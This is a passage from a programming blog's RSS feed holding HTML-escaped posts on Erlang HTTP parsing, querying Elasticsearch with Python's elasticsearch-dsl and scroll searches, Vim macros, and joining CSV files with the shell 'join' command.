&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;field1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;ofjeofje    &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;field3&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot; foefjoejfe&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="s"&gt;&amp;quot;    field5&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Since this is easily customizable, one could think of parsing the header's fields
(the fields separator is &lt;code&gt;\r\n&lt;/code&gt; and the key-value separator is &lt;code&gt;:&lt;/code&gt;) and put
them in a &lt;a href="http://erlang.org/doc/man/maps.html"&gt;map&lt;/a&gt; for easy retrieval. I let
that coding exercise to the reader ;-)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Happy coding !!&lt;/strong&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">deadc0de</dc:creator><pubDate>Mon, 08 Feb 2016 00:00:00 +0100</pubDate><guid>tag:deadc0de.re,2016-02-08:articles/erlang-http-parsing.html</guid><category>erlang</category><category>parsing</category></item><item><title>Query Elasticsearch with Python</title><link>https://deadc0de.re/articles/python-es.html</link><description>&lt;p&gt;Before, when I needed to query an elasticsearch cluster and retrieve data, I always
ended up doing some curl-fu. It's nice and quick however if you want to retrieve
a lot of data and are in the need of something more powerful you need something
else. Moreover json is aweful to deal with on the command line !&lt;/p&gt;
&lt;p&gt;I came across those two python libraries which are quite nice:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://elasticsearch-py.readthedocs.org/"&gt;Elasticsearch-py&lt;/a&gt;: the
    official low-level library for querying elasticsearch&lt;/li&gt;
&lt;li&gt;&lt;a href="https://elasticsearch-dsl.readthedocs.org/"&gt;Elasticsearch-dsl&lt;/a&gt;: the
    high-level library built above elasticsearch-py&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Combining those two libraries provides you with really powerful ways to
insert, query and manage your ES's data.
I won't describe in details the use of those libraries but there are two main
features I've used and found very nice:&lt;/p&gt;
&lt;h3&gt;Filtering&lt;/h3&gt;
&lt;p&gt;With these libraries, constructing your query is now way easier than
using some json:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;elasticsearch&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;elasticsearch_dsl&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Search&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Q&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;F&lt;/span&gt;
&lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="n"&gt;client&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;elasticsearch&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Elasticsearch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ES_HOST&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;using&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;INDEX&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c"&gt;# only return specific fields&lt;/span&gt;
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fields&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;field0&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;field1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;

&lt;span class="c"&gt;# add some filters&lt;/span&gt;
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;term&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;_type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;SOMETYPE&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;range&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;gt&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;1000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="n"&gt;F&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;term&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;othercount&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="c"&gt;# sort the results&lt;/span&gt;
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sort&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;count&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;order&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;desc&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;}})&lt;/span&gt;
&lt;span class="o"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;As shown above, you can think of any type of filters without having to
fight with json syntax and stuff. For more info on the different types of
ES filter, see
&lt;a href="https://www.elastic.co/guide/en/elasticsearch/reference/2.0/query-dsl.html"&gt;ES offical query DSL&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;Query in batch&lt;/h3&gt;
&lt;p&gt;The next very interesting feature is the ability to perform
&lt;a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/search-request-scroll.html"&gt;scroll searches&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;This is very efficient when you need to retrieve a bunch of documents/results on
a very large index. And it's quite elegant in python:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;elasticsearch&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;elasticsearch_dsl&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Search&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Q&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;F&lt;/span&gt;
&lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;es_scroll&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;search&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="c"&gt;# Initialize the scroll&lt;/span&gt;
    &lt;span class="n"&gt;gotten&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
    &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;scroll&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;SCROLLDURATION&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="n"&gt;search_type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;scan&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;search&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;to_dict&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
    &lt;span class="n"&gt;sid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;_scroll_id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="n"&gt;total&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;page&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;hits&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;total&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="n"&gt;batchgot&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;total&lt;/span&gt;

    &lt;span class="c"&gt;# scrolling through this view&lt;/span&gt;
    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;batchgot&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;scroll&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;scroll_id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;sid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;scroll&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;SCROLLDURATION&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
      &lt;span class="n"&gt;sid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;_scroll_id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
      &lt;span class="n"&gt;batchgot&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;page&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;hits&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;hits&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
      &lt;span class="n"&gt;gotten&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;batchgot&lt;/span&gt;
      &lt;span class="c"&gt;# do something with the results&lt;/span&gt;
      &lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;page&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;hits&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;hits&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;gotten&lt;/span&gt;
&lt;span class="o"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Scroll searches provide you with a kind of snapshot of your data and
allows you to retrieve it in batch. Called
&lt;a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/search-request-scroll.html#scroll-search-context"&gt;Search context&lt;/a&gt;,
it could be seen as a view in SQL databases.&lt;/p&gt;
&lt;p&gt;The parameter &lt;code&gt;SCROLLDURATION&lt;/code&gt; defines how long the view of the data is to be
kept (this is updated at each scroll's call).
The function &lt;code&gt;func&lt;/code&gt; is called after each batch to handle the results.&lt;/p&gt;
&lt;p&gt;This is very convenient and much faster than querying ES one document at a time !&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Happy searches in bigdata&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="bigdata searches" src="https://deadc0de.re/gifs/bigdata.gif" /&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">deadc0de</dc:creator><pubDate>Mon, 01 Feb 2016 00:00:00 +0100</pubDate><guid>tag:deadc0de.re,2016-02-01:articles/python-es.html</guid><category>elasticsearch</category><category>python</category><category>programming</category></item><item><title>Vim's macro</title><link>https://deadc0de.re/articles/vim-macro.html</link><description>&lt;p&gt;Vim's macros are very efficient, elegant and worth checking out.
If you already like the &lt;em&gt;dot&lt;/em&gt; (.) command, you will love macros.
Vim's macros allow you to repeat a &lt;em&gt;recording&lt;/em&gt; of
a sequence of command.&lt;/p&gt;
&lt;p&gt;For the following examples, I will use this content,
the goal is to remove the spaces and the trailing commas.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;a, 2,
b, 3,
c, 4,
d, 5,
e, 6,
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Using visual block mode&lt;/h2&gt;
&lt;p&gt;Although this article is about using macros, I will start with the way I was doing it
before I knew about macro. As you'll see later, macros are way more elegant !&lt;/p&gt;
&lt;p&gt;This will be done using the visual block mode of vim, selecting a full column and then
applying a command to the entire column.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Select the spaces and delete them&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;f&amp;lt;space&amp;gt;&amp;lt;CTRL&amp;gt;v99jx
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Go to the end of the line, select the commas and delete them&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;$&amp;lt;CTRL&amp;gt;v99jx
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Here's a description of the different steps above:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;f&amp;lt;space&amp;gt;&lt;/code&gt; goes to the first space&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;CTRL&amp;gt;v&lt;/code&gt; enters visual block mode&lt;/li&gt;
&lt;li&gt;&lt;code&gt;99j&lt;/code&gt; applies 99 times &lt;code&gt;j&lt;/code&gt; in order to select the entire column in the file&lt;/li&gt;
&lt;li&gt;&lt;code&gt;x&lt;/code&gt; deletes everything that's being selected&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$&lt;/code&gt; goes to the end of the line&lt;/li&gt;
&lt;li&gt;...&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This is a little screencast of this execution:&lt;/p&gt;
&lt;p&gt;&lt;img alt="vim visual column" src="https://deadc0de.re/gifs/vim-col.gif" /&gt;&lt;/p&gt;
&lt;h2&gt;Using a macro I&lt;/h2&gt;
&lt;p&gt;With a macro, you can record a single execution on the first line and then
execute it on all the subsequent lines.
Using macro in vim is quite easy: the recording is started with
&lt;code&gt;q&amp;lt;register&amp;gt;&lt;/code&gt; and ended it with &lt;code&gt;q&lt;/code&gt;. It is then applied using &lt;code&gt;@&amp;lt;register&amp;gt;&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Try it:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;start recording (here in register &lt;code&gt;a&lt;/code&gt;): &lt;code&gt;qa&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;everything is now being recorded and saved in register &lt;em&gt;a&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;find the next space: &lt;code&gt;f&amp;lt;space&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;delete it: &lt;code&gt;x&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;go to the end of line and delete the comma: &lt;code&gt;$x&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;stop recording: &lt;code&gt;q&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You can visualize the list of commands saved in the &lt;em&gt;a&lt;/em&gt; register using &lt;code&gt;:reg a&lt;/code&gt;.
And then apply that to the rest of the lines:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;select the second line up to the end of file: &lt;code&gt;:2VG&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;and execute the macro: &lt;code&gt;:norm @a&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;That's it !&lt;/p&gt;
&lt;p&gt;&lt;img alt="vim macro example 1" src="https://deadc0de.re/gifs/vim-macro-1.gif" /&gt;&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;normal&lt;/code&gt; command (here I used the shortcut &lt;code&gt;norm&lt;/code&gt;) is used to execute a set of
vim commands as if you were in &lt;em&gt;normal&lt;/em&gt; mode (see &lt;code&gt;:help normal&lt;/code&gt; for more info).&lt;/p&gt;
&lt;h2&gt;Using macro II&lt;/h2&gt;
&lt;p&gt;In this second example, the goal is to change the case of the first character
and then increment the number by one using macro:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;start by going to the beginning of the file: &lt;code&gt;gg&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;record the macro in register m: &lt;code&gt;qm&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;toggling case is done with tilde: &lt;code&gt;~&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;then go until the next comma: &lt;code&gt;t,&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;increment the number under the cursor with: &lt;code&gt;&amp;lt;CTRL&amp;gt;a&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;and go to the next line: &lt;code&gt;+&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;finally save the macro: &lt;code&gt;q&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You can then apply that macro using &lt;code&gt;@m&lt;/code&gt; multiple time (since the &lt;code&gt;+&lt;/code&gt; was used,
the macro will automatically jump on the next line). A good time saver is &lt;code&gt;@@&lt;/code&gt;
which will repeat the last macro. Another way of repeating a macro is by prepending
the command with a count as for example &lt;code&gt;99@m&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Using macro III&lt;/h2&gt;
&lt;p&gt;This is another nice example of the power of vim's macro.&lt;/p&gt;
&lt;p&gt;Our example file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;a,&amp;quot;this is a&amp;quot;
b,&amp;quot;this is b&amp;quot;
c,&amp;quot;this is c&amp;quot;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The goal is to replace what is inside the quotes with &lt;em&gt;is no more&lt;/em&gt;
and add the first char of the line at the beginning of that text
such that &lt;code&gt;a,"this is a"&lt;/code&gt; becomes &lt;code&gt;"a,"a is no more"&lt;/code&gt; and apply
that to all subsequent lines.&lt;/p&gt;
&lt;p&gt;Let's get started on the first line:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;start recording in buffer &lt;em&gt;q&lt;/em&gt;: &lt;code&gt;qq&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;go to the first space (any place inside the quotes will do): &lt;code&gt;f&amp;lt;space&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;and then edit the whole content inside the quotes: &lt;code&gt;ci"&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;add the new text: &lt;code&gt;&amp;lt;space&amp;gt;is no more&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;escape editing mode&lt;/li&gt;
&lt;li&gt;go the the beginning of the line: &lt;code&gt;0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;copy the char under the cursor: &lt;code&gt;yl&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;go to the first quote: &lt;code&gt;f"&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;paste the char: &lt;code&gt;p&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;stop the recording: &lt;code&gt;q&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And then apply it to all lines:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;go to the second line and select all lines up to the end of the file: &lt;code&gt;:2VG&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;apply the macro to these lines: &lt;code&gt;:norm @q&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Here's a little screencast that demonstrates this execution.&lt;/p&gt;
&lt;p&gt;&lt;img alt="vim macro example 2" src="https://deadc0de.re/gifs/vim-macro-2.gif" /&gt;&lt;/p&gt;
&lt;p&gt;One more thing: you can append more command to a macro by restarting the macro with the capital
letter of the register where you saved your commands. For example &lt;code&gt;qA ... q&lt;/code&gt;
for register &lt;em&gt;a&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;I hope next time you'll have to apply the same pattern to a content, you will
try to use macros !&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">deadc0de</dc:creator><pubDate>Thu, 14 Jan 2016 00:00:00 +0100</pubDate><guid>tag:deadc0de.re,2016-01-14:articles/vim-macro.html</guid><category>vim</category></item><item><title>Shell-fu - join</title><link>https://deadc0de.re/articles/shell-fu-join.html</link><description>&lt;p&gt;Let's say you have multiple two-fields csv files that you want to join on their
first field. For example:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;a.csv     b.csv
-----     -----
a,1       b,10
b,2       c,20

=&amp;gt;

&lt;span class="gh"&gt;Result&lt;/span&gt;
&lt;span class="gh"&gt;------&lt;/span&gt;
a,1,0
b,2,10
c,0,20
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Here are the basic join switches that will be used:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;-a1 -a2&lt;/strong&gt;: we also want the unpairable lines of each file&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-j1&lt;/strong&gt;: join on the first field of each file&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-t,&lt;/strong&gt;: specify the separator&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;For a more complete explanation of those options, see join's man page.&lt;/p&gt;
&lt;p&gt;That is all what is needed to join two files (the sort command
is added for reference although the files are already sorted):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;join -a1 -a2 -j1 -t, &amp;lt;&lt;span class="o"&gt;(&lt;/span&gt;sort -t, -k1 a.csv&lt;span class="o"&gt;)&lt;/span&gt; &amp;lt;&lt;span class="o"&gt;(&lt;/span&gt;sort -t, -k1 b.csv&lt;span class="o"&gt;)&lt;/span&gt;
a,1
b,2,10
c,20
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So far so good, however we now don't know to which file belonged &lt;em&gt;a&lt;/em&gt; and &lt;em&gt;c&lt;/em&gt;.
Let's fix that.&lt;/p&gt;
&lt;p&gt;Now comes the &lt;strong&gt;-o&lt;/strong&gt; options which allows
to control what will be outputted. A &lt;em&gt;'0'&lt;/em&gt; means to output the
joined field and additional &lt;em&gt;FILENUM.FIELD&lt;/em&gt; which field of which file (&lt;em&gt;1&lt;/em&gt; or &lt;em&gt;2&lt;/em&gt;)
is to be added to the output. There's however a nice simplification using the keyword &lt;em&gt;auto&lt;/em&gt; that automagically
determines how many fields from each file to output based on their first line.&lt;/p&gt;
&lt;p&gt;Using &lt;strong&gt;-o 'auto'&lt;/strong&gt; the output becomes:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;join -a1 -a2 -j1 -t, -o &lt;span class="s1"&gt;&amp;#39;auto&amp;#39;&lt;/span&gt; a.csv b.csv
a,1,
b,2,10
c,,20
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now it's clear that &lt;em&gt;a&lt;/em&gt; belongs to &lt;em&gt;a.csv&lt;/em&gt; and &lt;em&gt;c&lt;/em&gt; to &lt;em&gt;b.csv&lt;/em&gt;.
It is however nice to complete the command with &lt;strong&gt;-e0&lt;/strong&gt;
to replace missing fields with a &lt;em&gt;0&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;join -a1 -a2 -j1 -t, -o &lt;span class="s1"&gt;&amp;#39;auto&amp;#39;&lt;/span&gt; -e0 a.csv b.csv
a,1,0
b,2,10
c,0,20
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Perfect. Now we can add a new file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="gh"&gt;d.csv&lt;/span&gt;
&lt;span class="gh"&gt;-----&lt;/span&gt;
a,100
x,200
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;and join them all:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;join -a1 -a2 -j1 -t, -o &lt;span class="s1"&gt;&amp;#39;auto&amp;#39;&lt;/span&gt; -e0 &amp;lt;&lt;span class="o"&gt;(&lt;/span&gt;join -a1 -a2 -j1 -t, -o &lt;span class="s1"&gt;&amp;#39;auto&amp;#39;&lt;/span&gt; -e0 a.csv b.csv&lt;span class="o"&gt;)&lt;/span&gt; d.csv
a,1,0,100
b,2,10,0
c,0,20,0
x,0,0,200
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You can then integrate that in some crazy one-liner or into a shell script to join any number of csv you want.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">deadc0de</dc:creator><pubDate>Mon, 04 Jan 2016 00:00:00 +0100</pubDate><guid>tag:deadc0de.re,2016-01-04:articles/shell-fu-join.html</guid><category>bash</category><category>shell</category><category>script</category><category>join</category></item><item><title>Getting started with erlang</title><link>https://deadc0de.re/articles/erlang-first-steps.html</link><description>&lt;p&gt;I recently had to learn &lt;a href="http://www.erlang.org/"&gt;Erlang&lt;/a&gt; for a project with no prior knowledge of the language.
